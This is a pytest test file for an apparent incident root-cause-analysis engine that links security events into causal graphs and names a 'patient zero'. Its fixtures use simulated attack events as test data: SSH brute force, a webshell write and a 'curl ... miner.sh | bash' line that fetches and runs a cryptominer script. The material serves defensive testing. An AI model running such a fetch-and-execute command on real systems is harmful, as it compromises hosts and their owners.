"""
Unit and integration tests for Automated Incident Root Cause Analysis (RCA) & Causal Graph Engine.
"""

from datetime import datetime, timedelta
import pytest
from fastapi.testclient import TestClient

from cybershield.api.server import app
from cybershield.rca.engine import CausalRCAEngine
from cybershield.rca.schemas import (
    CausalNodeType,
    RCARequest,
    RootCauseConfidence,
)


@pytest.fixture
def engine():
    return CausalRCAEngine()


@pytest.fixture
def client():
    return TestClient(app)


def test_seeded_rca_report_structure(engine):
    reports = engine.list_reports()
    assert len(reports) >= 1
    rep = reports[0]
    assert rep.incident_id == "INC-2026-001"
    assert len(rep.nodes) == 5
    assert len(rep.edges) == 4
    assert rep.patient_zero_hypothesis is not None
    assert rep.patient_zero_hypothesis.confidence == RootCauseConfidence.DEFINITIVE
    assert "spearphishing" in rep.patient_zero_hypothesis.summary.lower()
    assert len(rep.patient_zero_hypothesis.recommended_remediations) >= 3


def test_dynamic_incident_causal_analysis(engine):
    t0 = datetime.utcnow() - timedelta(minutes=10)
    req = RCARequest(
        incident_id="INC-TEST-99",
        events=[
            {
                "id": "EVT-1",
                "type": "AUTH_ATTEMPT",
                "timestamp": (t0).isoformat(),
                "host_id": "WS-DEV-10",
                "description": "Brute-force SSH login success for user gitlab-runner",
                "is_anomaly": True
            },
            {
                "id": "EVT-2",
                "type": "PROCESS_EXECUTION",
                "timestamp": (t0 + timedelta(seconds=3)).isoformat(),
                "host_id": "WS-DEV-10",
                "description": "curl http://198.51.100.99/miner.sh | bash",
                "is_anomaly": True
            },
            {
                "id": "EVT-3",
                "type": "NETWORK_CONNECTION",
                "timestamp": (t0 + timedelta(seconds=7)).isoformat(),
                "host_id": "WS-DEV-10",
                "description": "Outbound stratum+tcp connection to mining pool",
                "is_anomaly": True
            },
        ]
    )
    report = engine.analyze_incident(req)
    assert report.total_events_analyzed == 3
    assert len(report.edges) == 2
    assert report.patient_zero_hypothesis is not None
    assert report.patient_zero_hypothesis.root_node_id == "EVT-1"
    assert "WS-DEV-10" in report.blast_radius_hosts
    assert len(report.patient_zero_hypothesis.recommended_remediations) >= 2


def test_rca_overview_metrics(engine):
    metrics = engine.get_overview_metrics()
    assert metrics["total_rca_investigations"] >= 1
    assert metrics["patient_zero_identifications"] >= 1
    assert metrics["unique_hosts_in_blast_radius"] >= 1


def test_rca_api_lifecycle(client):
    # 1. List reports
    reps_res = client.get("/api/rca/reports")
    assert reps_res.status_code == 200
    assert len(reps_res.json()) >= 1
    rep_id = reps_res.json()[0]["report_id"]

    # 2. Get specific report
    det_res = client.get(f"/api/rca/reports/{rep_id}")
    assert det_res.status_code == 200
    assert det_res.json()["report_id"] == rep_id

    # 3. Analyze incident via API
    analyze_payload = {
        "incident_id": "INC-API-01",
        "events": [
            {
                "id": "API-EVT-1",
                "type": "FILE_MODIFICATION",
                "timestamp": datetime.utcnow().isoformat(),
                "host_id": "SRV-API-1",
                "description": "Webshell written to /var/www/html/shell.php",
                "is_anomaly": True
            },
            {
                "id": "API-EVT-2",
                "type": "PROCESS_EXECUTION",
                "timestamp": (datetime.utcnow() + timedelta(seconds=2)).isoformat(),
                "host_id": "SRV-API-1",
                "description": "whoami executed by www-data",
                "is_anomaly": True
            }
        ]
    }
    analyze_res = client.post("/api/rca/analyze", json=analyze_payload)
    assert analyze_res.status_code == 200
    res_data = analyze_res.json()
    assert res_data["incident_id"] == "INC-API-01"
    assert res_data["patient_zero_hypothesis"]["root_node_id"] == "API-EVT-1"

    # 4. Get overview
    ovr_res = client.get("/api/rca/overview")
    assert ovr_res.status_code == 200
    assert ovr_res.json()["total_rca_investigations"] >= 2
